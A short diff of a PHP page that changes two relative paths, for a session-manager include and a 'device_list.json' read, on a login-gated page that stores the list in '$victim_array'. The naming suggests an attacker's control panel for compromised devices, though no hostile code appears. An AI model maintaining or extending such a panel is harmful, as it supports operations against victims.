@@ -1,5 +1,5 @@
 <?php 
-require_once '../private/session_manager.php';
+require_once './private/session_manager.php';
 
 if(!isLogin()){
    header('Location: login.php');
@@ -76,7 +76,7 @@ if(!isLogin()){
                             <tbody>
                             <?php
 
-                            $strJsonFileContents = file_get_contents("../private/storage/device_list.json");
+                            $strJsonFileContents = file_get_contents("./private/storage/device_list.json");
                             $victim_array = json_decode($strJsonFileContents, true);
                             $index_victim = 1;
 
